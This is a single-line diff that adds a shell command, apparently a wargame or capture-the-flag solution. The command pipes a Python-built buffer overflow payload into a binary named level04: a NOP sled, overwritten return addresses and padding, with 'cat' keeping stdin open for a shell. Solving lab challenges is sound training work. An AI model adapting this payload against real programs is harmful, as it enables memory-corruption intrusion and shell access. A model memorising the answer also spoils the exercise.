@@ -1,0 +1,1 @@
+(python -c 'print "\x90" * 156 + "\xd0\xae\xe6\xf7" + "A" * 4 + "\xec\x97\xf8\xf7"'; cat) | ./level04
